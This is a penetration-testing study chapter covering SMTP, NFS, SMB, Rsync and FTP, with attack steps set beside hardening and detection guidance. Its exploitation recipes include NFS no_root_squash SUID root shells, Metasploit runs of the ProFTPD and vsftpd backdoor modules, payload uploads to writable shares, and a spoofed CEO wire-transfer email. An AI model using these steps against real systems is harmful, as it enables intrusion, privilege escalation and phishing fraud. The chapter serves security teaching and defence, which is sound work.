## 1. Overview

Beyond DNS, DHCP, NTP, SNMP, LDAP, and Kerberos, several auxiliary
services shape the enterprise attack surface: SMTP relay, NFS, SMB
(host-level), Rsync, and FTP. Each has its own history of
misconfigurations and abuse paths.

This file covers the most common auxiliary services at the protocol
level. Active Directory-specific SMB attacks live in
`01 Active Directory`; web-application-specific attacks live in
`APPLICATIONS`.

**Services covered:**

| Service | Ports | Typical use |
|---------|-------|-------------|
| SMTP | 25, 465, 587, 2525 | Mail submission and relay |
| NFS | 2049 (and 111 for rpcbind) | Unix file sharing |
| SMB | 445, 139 | Windows/Unix file sharing (host-level) |
| Rsync | 873 | File synchronization |
| FTP | 21, 990 (FTPS) | File transfer (legacy) |

**Why auxiliary services matter:**

- They are often forgotten in patch management.
- They frequently allow anonymous access or weak authentication.
- They often bypass network segmentation (file shares, mail relay).
- They are high-value targets for data exfiltration.

## 2. Reconnaissance / Enumeration

**Offensive - SMTP enumeration:**

    # Banner grabbing
    nc -nv 10.10.10.10 25

    # nmap scripts
    nmap -p 25 --script smtp-commands,smtp-enum-users,smtp-open-relay 10.10.10.10

    # Expected output (smtp-commands):
    # 25/tcp open  smtp
    # | smtp-commands: mail.example.com Hello, SIZE 10240000, VRFY, ETRN, ...
    # |_ 250-AUTH LOGIN PLAIN

    # VRFY / EXPN user enumeration (older servers)
    telnet 10.10.10.10 25
    > VRFY root
    > EXPN admin

    # Open relay test (nmap)
    nmap -p 25 --script smtp-open-relay 10.10.10.10

**Offensive - NFS enumeration:**

    # Show exports
    showmount -e 10.10.10.10

    # Expected output:
    # Export list for 10.10.10.10:
    # /srv/nfs  *
    # /home     10.10.10.0/24

    # nmap scripts
    nmap -p 111,2049 --script nfs-showmount,nfs-ls,nfs-statfs 10.10.10.10

    # Mount an export
    mkdir /mnt/nfs
    mount -t nfs 10.10.10.10:/srv/nfs /mnt/nfs
    ls -la /mnt/nfs

**Offensive - SMB enumeration (host-level):**

    # nmap scripts
    nmap -p 139,445 --script smb-os-discovery,smb-enum-shares,smb-enum-users,smb2-security-mode 10.10.10.10

    # smbclient
    smbclient -L //10.10.10.10 -N
    smbclient //10.10.10.10/share -N

    # netexec
    netexec smb 10.10.10.10 -u '' -p '' --shares
    netexec smb 10.10.10.10 -u guest -p '' --shares

    # enum4linux (all-in-one)
    enum4linux -a 10.10.10.10

**Offensive - Rsync enumeration:**

    # List available modules (no auth)
    rsync rsync://10.10.10.10/

    # Expected output:
    # module1      Description
    # module2      Another description
    # backup       Backup share

    # List a module
    rsync rsync://10.10.10.10/module1/
    rsync rsync://10.10.10.10/backup/

    # nmap script
    nmap -p 873 --script rsync-list-modules 10.10.10.10

**Offensive - FTP enumeration:**

    # Banner grabbing
    nc -nv 10.10.10.10 21

    # Anonymous login
    ftp 10.10.10.10
    > anonymous
    > (any password)
    > ls

    # nmap scripts
    nmap -p 21 --script ftp-anon,ftp-bounce,ftp-syst,ftp-proftpd-backdoor,ftp-vsftpd-backdoor 10.10.10.10

**Defensive - what to baseline:**

- SMTP: relay policy (open vs authenticated), TLS enforcement, user
  enumeration via VRFY/EXPN.
- NFS: export list, root_squash, no_subtree_check, all_squash.
- SMB: share list, signing requirement, guest access, SMBv1.
- Rsync: module list, authentication, read-only.
- FTP: anonymous access, TLS enforcement, server version.

## 3. Common Attack Vectors

**SMTP:**

- **Open relay** - server forwards mail for any sender; used for spam
  and phishing.
- **User enumeration** - VRFY/EXPN reveal valid usernames.
- **SMTP injection** - inject additional headers or recipients.
- **Weak authentication** - brute force SMTP AUTH.
- **Mail spoofing** - no SPF/DKIM/DMARC enforcement.
- **Server vulnerabilities** - Exim, Postfix, Sendmail CVEs.

**NFS:**

- **No root_squash** - root on the client maps to root on the server;
  write SUID binaries as "root".
- **World-readable exports** - any host can mount.
- **No authentication** - NFSv3 (and NFSv4 without Kerberos) has no
  auth.
- **Weak permissions** - shared directories with 0777.

**SMB (host-level):**

- **Guest access** - guest or anonymous access to shares.
- **Weak share permissions** - write access to all users.
- **SMBv1** - legacy protocol with known vulnerabilities.
- **Null session** - anonymous session enumeration.
- **SMB signing disabled** - vulnerable to relay.
- **SMB server vulnerabilities** - SambaCry, EternalBlue (Windows).

**Rsync:**

- **Anonymous access** - no auth on modules.
- **Writable modules** - upload arbitrary files.
- **No read-only flag** - clients can push changes.

**FTP:**

- **Anonymous access** - read/write access without credentials.
- **Cleartext credentials** - FTP sends credentials in the clear.
- **FTP bounce** - server used as a proxy.
- **Server vulnerabilities** - ProFTPD, vsftpd, FileZilla CVEs.

## 4. Exploitation Recipes

**SMTP - open relay test:**

    # 1. Connect to the SMTP server
    telnet 10.10.10.10 25

    # 2. Send a mail with a foreign sender and recipient
    HELO attacker.com
    MAIL FROM:<attacker@attacker.com>
    RCPT TO:<victim@victim.com>
    DATA
    Subject: test

    Test.
    .
    QUIT

    # If the server accepts (250 OK), it is an open relay.

**SMTP - user enumeration via VRFY:**

    telnet 10.10.10.10 25
    HELO attacker.com
    VRFY root
    VRFY admin
    VRFY alice
    QUIT

    # Expected output (if VRFY enabled):
    # 250 root <root@example.com>
    # 550 admin unknown

**NFS - mount and abuse no_root_squash:**

    # 1. Show exports
    showmount -e 10.10.10.10
    # Example: /srv/nfs  *

    # 2. Mount
    mkdir /mnt/nfs
    mount -t nfs 10.10.10.10:/srv/nfs /mnt/nfs

    # 3. If root_squash is disabled, act as root on the mount
    # (On the attacker as root):
    cp /bin/bash /mnt/nfs/rootbash
    chmod u+s /mnt/nfs/rootbash

    # 4. On the target (any user):
    /srv/nfs/rootbash -p
    # Expected output: root shell

**SMB - null session enumeration:**

    # 1. Test null session
    netexec smb 10.10.10.10 -u '' -p '' --shares

    # 2. Enumerate users via RPC (if null session allowed)
    rpcclient -U "" -N 10.10.10.10
    rpcclient $> enumdomusers
    rpcclient $> enumdomgroups

    # 3. Mount a share (if accessible)
    smbclient //10.10.10.10/share -N

**SMB - guest access:**

    # 1. Test guest
    netexec smb 10.10.10.10 -u guest -p '' --shares

    # 2. Access shares as guest
    smbclient //10.10.10.10/share -U guest%

**Rsync - anonymous access:**

    # 1. List modules
    rsync rsync://10.10.10.10/

    # 2. Download a module
    rsync -av rsync://10.10.10.10/module1/ /tmp/module1/

    # 3. Upload to a writable module
    rsync -av /tmp/payload rsync://10.10.10.10/backup/
    # (If the module allows uploads.)

**FTP - anonymous access:**

    # 1. Connect anonymously
    ftp 10.10.10.10
    > anonymous
    > (any password)
    > ls
    > get sensitive.txt

    # 2. Upload a file (if writable)
    > put payload.exe

**FTP - ProFTPD backdoor (CVE-2010-4221):**

    # nmap script
    nmap -p 21 --script ftp-proftpd-backdoor 10.10.10.10

    # Or use Metasploit
    msfconsole
    msf> use exploit/unix/ftp/proftpd_133c_backdoor
    msf> set RHOSTS 10.10.10.10
    msf> run

**FTP - vsftpd backdoor (CVE-2011-2523):**

    # nmap script
    nmap -p 21 --script ftp-vsftpd-backdoor 10.10.10.10

    # Or use Metasploit
    msfconsole
    msf> use exploit/unix/ftp/vsftpd_234_backdoor
    msf> set RHOSTS 10.10.10.10
    msf> run

**SMTP - mail spoofing (no SPF/DKIM/DMARC):**

    # 1. Connect to the mail server
    telnet 10.10.10.10 25

    # 2. Send a mail with a spoofed sender
    HELO attacker.com
    MAIL FROM:<ceo@target.com>
    RCPT TO:<employee@target.com>
    DATA
    Subject: Urgent: Wire transfer

    ...
    .
    QUIT

    # If SPF/DKIM/DMARC are not enforced, the mail arrives as if from
    # the CEO.

## 5. Post-Exploitation

**After SMTP:**

- Harvest valid usernames for password spray.
- Use the relay for phishing.
- Pivot to internal mail servers.

**After NFS:**

- Read all exported data.
- Write SUID binaries (if no_root_squash).
- Establish persistence via mounted shares.

**After SMB:**

- Read all accessible shares.
- Write files (if permissions allow).
- Pivot to other hosts (SMB relay).
- Harvest credentials from share files.

**After Rsync:**

- Read all module contents.
- Upload files (if writable).
- Pivot to the host via scheduled tasks if modules map to web roots.

**After FTP:**

- Read all accessible files.
- Upload files (if writable).
- Harvest credentials from config files.

**Cleanup (blue team):**

- Disable anonymous access to all services.
- Enforce authentication.
- Enforce TLS.
- Patch server software.
- Monitor for unusual access patterns.
- Restrict network access (firewall).

## 6. Risk Context

Auxiliary services are often the weakest link:

- Anonymous access is common (SMTP VRFY, NFS, SMB guest, Rsync, FTP
  anonymous).
- Cleartext protocols (FTP, unauthenticated SMTP, NFSv3) expose
  credentials and data.
- Write access allows malicious file placement.
- Misconfigured services can be pivoted into hosts.

**Blast radius:** an exposed NFS export with no_root_squash grants
root on the target; a writable SMB share grants code placement on the
target; an open SMTP relay grants mass phishing.

**Why attacks succeed:**

- Default configurations allow anonymous access.
- TLS is often not enforced.
- Patches are delayed for auxiliary services.
- Network segmentation does not always cover these ports.

## 7. Root Causes

- **Legacy defaults.** Anonymous access, cleartext, no TLS.
- **Missing authentication.** NFSv3, Rsync, FTP anonymous.
- **Weak permissions.** 0777 on shares, world-writable modules.
- **No monitoring.** Auxiliary services are rarely logged.
- **Patch delays.** Server software is often out of date.
- **No segmentation.** Auxiliary services reachable from anywhere.

## 8. Preventive Controls

**SMTP:**

- Disable open relay.
- Require authentication for submission.
- Disable VRFY and EXPN.
- Enforce TLS (STARTTLS or SMTPS).
- Deploy SPF, DKIM, DMARC.
- Patch the MTA.

**NFS:**

- Restrict exports to specific hosts (not `*`).
- Enable root_squash (default in modern NFS).
- Use NFSv4 with Kerberos (krb5p).
- Restrict permissions on exported directories.

**SMB:**

- Disable guest access.
- Disable anonymous share enumeration.
- Require SMB signing.
- Disable SMBv1.
- Restrict share permissions.
- Patch the SMB server.

**Rsync:**

- Require authentication (`auth users`, `secrets file`).
- Set `read only = yes` for public modules.
- Restrict to specific hosts (`hosts allow`).
- Use SSH transport instead of native rsync protocol.

**FTP:**

- Disable anonymous access.
- Enforce FTPS (FTP over TLS).
- Use SFTP instead of FTP.
- Patch the server.

**General:**

- Enable logging for all services.
- Forward logs to a SIEM.
- Segment auxiliary services from user networks.
- Patch regularly.

## 9. Detection Controls

**SMTP:**

- Alert on open relay usage.
- Alert on VRFY/EXPN attempts.
- Alert on authentication failures.
- Monitor mail queue growth (open relay abuse).

**NFS:**

- Alert on mounts from unauthorized hosts.
- Alert on writes to SUID-capable directories.
- Monitor `rpcbind` queries.

**SMB:**

- Event 4624 (logon) with `Logon Type = 3` and `NULL SESSION` or
  `guest`.
- Event 5140 / 5145 (share access) from unauthorized hosts.
- Alert on anonymous enumeration.

**Rsync:**

- Alert on anonymous module listing.
- Alert on writes to modules.
- Monitor for unusual sync patterns.

**FTP:**

- Alert on anonymous login.
- Alert on brute force attempts.
- Monitor for unusual file transfers.

**General:**

- Forward logs to a SIEM.
- Baseline normal patterns; alert on anomalies.
- Use IDS/IPS signatures for known exploits.

## 10. Verification

**Offensive - did the attack succeed?**

- SMTP: open relay accepted a foreign mail; VRFY revealed users.
- NFS: export mounted; no_root_squash allowed SUID placement.
- SMB: null session or guest access enumerated shares.
- Rsync: anonymous access listed modules; writable module accepted
  upload.
- FTP: anonymous login succeeded; files read or written.

**Defensive - are controls effective?**

- Test SMTP: relay is closed; VRFY is disabled.
- Test NFS: exports restricted; root_squash enabled.
- Test SMB: guest access disabled; SMB signing required.
- Test Rsync: authentication required; modules read-only.
- Test FTP: anonymous access disabled; FTPS enforced.

## 11. OSCP Notes

- Auxiliary services are common OSCP enumeration targets.
- Practice: `showmount`, `smbclient`, `enum4linux`, `rsync`,
  `ftp`.
- **Capture screenshots** of:
  - The enumeration output for each service.
  - Anonymous access or null session.
  - Any files read or written.
- The `> [!IMPORTANT]` OSCP reporting note applies to any auxiliary
  service finding.

## 12. Production Notes

- Anonymous access to auxiliary services is still common in legacy
  environments.
- NFS no_root_squash is rare in modern deployments but appears in
  legacy ones.
- SMB guest access is disabled by default in modern Windows but may
  be enabled in legacy or misconfigured systems.
- Rsync anonymous access is common in backup servers.
- FTP is deprecated; migrate to SFTP.
- Monitor all auxiliary services; they are often forgotten.

## 13. References

**RFCs and documentation:**

- [RFC 5321 - SMTP](https://www.rfc-editor.org/rfc/rfc5321)
- [RFC 1094 - NFS v2](https://www.rfc-editor.org/rfc/rfc1094) / [RFC 7530 - NFS v4](https://www.rfc-editor.org/rfc/rfc7530)
- [MS-SMB2 - SMB Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/)
- [Rsync documentation](https://rsync.samba.org/documentation.html)
- [RFC 959 - FTP](https://www.rfc-editor.org/rfc/rfc959)

**MITRE ATT&CK:**

- [Discovery - Network Service Scanning (T1046)](https://attack.mitre.org/techniques/T1046/)
- [Collection - Data from Network Shared Drive (T1039)](https://attack.mitre.org/techniques/T1039/)
- [Exfiltration Over Alternative Protocol (T1048)](https://attack.mitre.org/techniques/T1048/)
- [Initial Access - Phishing (T1566)](https://attack.mitre.org/techniques/T1566/)

**Tools:**

- [enum4linux](https://github.com/CiscoCXSecurity/enum4linux)
- [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)
- [rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html)
- [showmount](https://linux.die.net/man/8/showmount)
- [rsync](https://rsync.samba.org/)
- [ftp](https://linux.die.net/man/1/ftp)

**Research:**

- [HackTricks - SMTP Pentesting](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp)
- [HackTricks - NFS Pentesting](https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting)
- [HackTricks - SMB Pentesting](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb)
- [HackTricks - Rsync Pentesting](https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync)
- [HackTricks - FTP Pentesting](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp)